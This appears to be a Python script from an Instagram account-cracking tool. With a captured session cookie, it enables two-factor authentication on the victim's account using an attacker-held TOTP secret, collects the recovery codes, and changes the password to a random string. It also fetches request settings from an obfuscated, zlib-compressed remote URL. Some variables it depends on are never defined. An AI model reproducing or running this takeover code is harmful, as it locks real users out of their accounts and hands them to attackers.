import re, os, uuid, sys, requests, datetime, hashlib, urllib, pytz, zlib, time, json, random, base64, string
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as bsp
from rich import print as Print
from rich.panel import Panel as Nel
from rich.console import Console
from rich.tree import Tree
id, Loop, MethodType, ResultSuccess, ResultChechpoint,UbahData,info,proxi,NazriDev, MID, PROXY, CrackDuplikat, bugbaru = [], 0, [], 0, 0, [], {}, [], {}, [], {'Update':None,'proxi':[]}, [], []
KamuNya = b'x\x9c\xcb())(\xb6\xd2\xd7/H,.I\xd5+I\xd6/J,\xd7\xcf)(\xc8\xd651335\x06\x00\xb4|\n\x82'

def timezone_offset(self):
       tim = datetime.datetime.now(pytz.timezone('Asia/Jakarta'))
       ofs = tim.utcoffset().total_seconds()/60/60
       return ofs

def Android_ID(users, passwd):
    xyz = hashlib.md5()
    xyz.update(users.encode('utf-8') + passwd.encode('utf-8'))
    hex = xyz.hexdigest()
    xyz.update(hex.encode('utf-8') + '12345'.encode('utf-8'))
    return xyz
   
def data_graph(xxx):
    data = {
        'av': re.search('{"actorID":"(\d+)"', str(xxx)).group(1),
        '__d': 'www',
        '__user': '0',
        '__a':'1',
        '__req': 'h',
        '__hs': re.search('"haste_session":"(.*?)"', str(xxx)).group(1),
        'dpr': '2',
        '__ccg': 'GOOD',
        '__rev': re.search('{"consistency":{"rev":(\d+)}', str(xxx)).group(1),
        '__s': '',
        '__hsi': re.search('"hsi":"(\d+)"', str(xxx)).group(1),
        '__dyn': '',
        '__csr': '',
        '__comet_req': re.search('__comet_req=(\d+)', str(xxx)).group(1),
        'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),
        'jazoest': re.search('jazoest=(\d+)', str(xxx)).group(1),
        'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
        '__spin_r': re.search('"__spin_r":(\d+)', str(xxx)).group(1),
        '__spin_b': 'trunk',
        '__spin_t': re.search('"__spin_t":(\d+)', str(xxx)).group(1),
        'fb_api_caller_class': 'RelayModern',
        'fb_api_req_friendly_name': 'PolarisPostCommentsContainerQuery',
        'server_timestamps': 'true',
        'doc_id': '6888165191230459'
    }
    return(data)

def headers_graph(xxx):
    headers = {
        'x-fb-friendly-name': 'PolarisPostCommentsContainerQuery',
        'x-ig-app-id': '1217981644879628',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded',
        'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
        'accept': '*/*',
    }
    return(headers)

def TahapPertama2f(cokie, url = 'https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point'):
    try:
        resp = requests.Session().get(url, cookies = {'cookie': cokie}).text
        head = headers_graph(resp)
        head.update({
            'Host': 'accountscenter.instagram.com',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
            'x-fb-friendly-name': 'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(resp)).group(1),
            'x-ig-app-id': '1217981644879628',
        })
        data = data_graph(resp)
        data.update({
            'fb_api_caller_class':'RelayModern',
            'fb_api_req_friendly_name':'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
            'variables':json.dumps({"input":{"client_mutation_id":f"{ClientId(resp)}","actor_id":f"{AccountId(resp)}","account_id":f"{AccountId(resp)}","account_type":"INSTAGRAM","device_id":"device_id_fetch_ig_did","fdid":"device_id_fetch_ig_did"}}),
            'doc_id':'6282672078501565',
        })
        get_p = requests.post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies = {'cookie':cokie}).text
        if "totp_key" in str(get_p):
            xnxx = re.search('"key_text":"(.*?)"', str(get_p)).group(1)
            hpsx = xnxx.replace(' ','')
            kode = requests.get(f'https://2fa.live/tok/{hpsx}').json()['token']
            info.update({'SecretKey':hpsx})
            AktifkanA2f(cokie, kode, resp, hpsx)
        else:
            info.update({'SecretKey':'Kode Authentikasi Tidak Ada'})
            info.update({'success-a2f':False})
            info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
    except Exception as e:
        info.update({'SecretKey':'Kode Authentikasi Tidak Ada'})
        info.update({'success-a2f':False})
        info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
    return info

def AktifkanA2f(cokie, code, resp, auth):
    try:
        xxx, ua = resp, 'Instagram 163.0.0.45.122 Android (28/9; 440dpi; 1080x2130; Xiaomi/xiaomi; Redmi Note 8; ginkgo; qcom; ru_RU; 250742113)'
        head = headers_graph(resp)
        head.update({
            'Host': 'accountscenter.instagram.com',
            'x-ig-app-id': '1217981644879628',
            'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(resp)).group(1),
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': ua,
            'x-fb-friendly-name': 'useFXSettingsTwoFactorEnableTOTPMutation',
        })
        data = {'av':AccountId(resp),'__user':'0','__a':'1','__req':'14','__hs':re.search('"haste_session":"(.*?)"', str(xxx)).group(1),'dpr':'2','__ccg':'GOOD','__rev':re.search('{"rev":(.*?)}',str(xxx)).group(1),'__hsi':re.findall('"hsi":"(\d+)"',str(xxx))[0],'__comet_req':'24','fb_dtsg':re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),'jazoest':re.findall('&jazoest=(\d+)',str(xxx))[0],'lsd':re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),'__spin_r':re.findall('"__spin_r":(\d+)', str(xxx))[0],'__spin_b':'trunk','__spin_t':re.findall('"__spin_t":(\d+)', str(xxx))[0],'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'useFXSettingsTwoFactorEnableTOTPMutation','variables':json.dumps({"input":{"client_mutation_id":re.search('{"clientID":"(.*?)"}',str(resp)).group(1),"actor_id":re.findall('"actorID":"(\d+)"', str(resp))[0],"account_id":re.findall('"actorID":"(\d+)"', str(resp))[0],"account_type":"INSTAGRAM","verification_code":code,"device_id":"device_id_fetch_ig_did","fdid":"device_id_fetch_ig_did"}}),'server_timestamps':'true','doc_id':'7032881846733167'}
        ondw = requests.Session().post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies={'cookie':cokie}).text
        if '"success":true' in str(ondw):
            info.update({'success-a2f':True})
            reco = get_code(cokie, resp)
            if reco is not None:
                try:
                    kode = reco['data']['xfb_two_factor_regenerate_recovery_codes']['recovery_codes']
                    info.update({'kode-pemulihan':kode})
                except:
                    info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
            else:info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
        else:
            info.update({'success-a2f':False})
            info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
    except Exception as e:
        info.update({'success-a2f':False})
        info.update({'kode-pemulihan':'Kode Pemulihan Tidak ada'})

def AccountId(xxx):
    try:
        Userid = re.search('{"actorID":"(\d+)"', str(xxx)).group(1)
        return(Userid)
    except AttributeError:return('')
    except requests.exceptions.ConnectionError: time.sleep(5); AccountId(xxx)

def ClientId(xxx):
    try:
        Clients = re.search('{"clientID":"(.*?)"}', str(xxx)).group(1)
        return Clients
    except AttributeError:return('')
    except requests.exceptions.ConnectionError: time.sleep(5); ClientId(xxx)

def get_code(cokie, response):
    try:
        data = data_graph(response)
        clin = ClientId(response)
        user = data['av']
        data.update({'__req':'t','__s':'','__dyn':'','__csr':'','fb_api_req_friendly_name':'useFXSettingsTwoFactorRegenerateRecoveryCodesMutation','variables':'{"input":{"client_mutation_id":"'+clin+'","actor_id":"'+user+'","account_id":"'+user+'","account_type":"INSTAGRAM","fdid":"device_id_fetch_ig_did"}}','doc_id':'24010978991879298'})
        head = headers_graph(response)
        head.update({
            'Host': 'accountscenter.instagram.com',
            'sec-ch-ua': 'Not_A',
            'x-ig-app-id': '936619743392459',
            'sec-ch-ua-mobile': '?0',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'viewport-width': '980',
            'x-fb-friendly-name': 'useFXSettingsTwoFactorFetchRecoveryCodesMutation',
            'x-fb-lsd': '7g42wKUg5uJbzrClbnTyuB',
            'content-type': 'application/x-www-form-urlencoded',
            'x-asbd-id': '129477',
            'dpr': '2',
            'sec-ch-ua-full-version-list': 'Not_A',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua-platform': 'Linux',
            'accept': '*/*',
            'origin': 'https://accountscenter.instagram.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://accountscenter.instagram.com/password_and_security/two_factor/',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',})
        reqs = requests.post('https://accountscenter.instagram.com/api/graphql/', cookies={'cookie':cokie}, data=data, headers=head).json()
        return reqs
    except Exception as e:
        return None

def OverPower():
    while True:
        try:
            uid = str(uuid.uuid4())
            ps  = requests.get(zlib.decompress(KamuNya)).json()

            NazriDev.update({'data':ps['xyraacode']['MidConfig'],'curl':ps['CURLpost']['xyraacodeURL'],'meta':ps['Headers']['xyraacodeHEAD']})
            data = NazriDev['data']
            data.update({
                'device_id':'android-%s'%(Android_ID('null','null').hexdigest()[:16]),
                'custom_device_id':str(uid),
            }
            )
            meta = NazriDev['meta']
            meta.update({
                'x-ig-device-id': str(uid),
                'x-ig-android-id': str(data['device_id']),
                'x-ig-timezone-offset': str(timezone_offset()),
                'content-length': str(len(data))
            }
            )
            resp = requests.post(NazriDev['curl'], data=data, headers=meta)
            appc = resp.headers['ig-set-x-mid']
            if appc not in MID:
                if len(MID) <6:
                    MID.append(appc)
                else: break
        except: break

def PasswordNEW(self):
    abd = ['ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz']
    san = ''.join(random.choice(random.choice(abd)) for _ in range(12))
    return(san)

def SandiBaru(cookie, old_pw):
    try:
        resp = requests.get('https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point', cookies={'cookie':cookie}).text
        head = headers_graph(resp)
        head.update({'Host': 'accountscenter.instagram.com','x-fb-friendly-name': 'useFXSettingsChangePasswordMutation','user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',})
        data      = data_graph(resp)
        old_pwx   = "#PWD_BROWSER:0:{}:{}".format(int(time.time()),old_pw)
        sand = PasswordNEW()
        new_pw    = "#PWD_BROWSER:0:{}:{}".format(int(time.time()),sand)
        data.update({'fb_api_req_friendly_name': 'useFXSettingsChangePasswordMutation','variables': '{"account_id":"'+data['av']+'","account_type":"INSTAGRAM","current_password_enc":{"sensitive_string_value":"'+str(old_pwx)+'"},"new_password_enc":{"sensitive_string_value":"'+str(new_pw)+'"},"new_password_confirm_enc":{"sensitive_string_value":"'+str(new_pw)+'"},"client_mutation_id":"'+ClientId(resp)+'","should_logout":false}','doc_id': '6616377658461852',})
        respon = requests.post('https://accountscenter.instagram.com/api/graphql/', cookies={'cookie':cookie}, data=data, headers=head).text
        if '"success":true' in str(respon):return new_pw.split(':')[3]
        else:return old_pwx.split(':')[3]
    except:return old_pw
    
def Convert(dict_c):
       cokz = ';'.join(['%s=%s'%(x,y) for x,y in dict_c.items()])
       return cokz
   
cookie = Convert(cokie)
a2f = TahapPertama2f(cookie)
cex = 'A2F Di Aktifkan' if a2f['success-a2f'] is True else 'A2F Tidak Aktif'
aut = a2f['SecretKey']
pem = a2f['kode-pemulihan']
PWX = SandiBaru(cookie, pwb)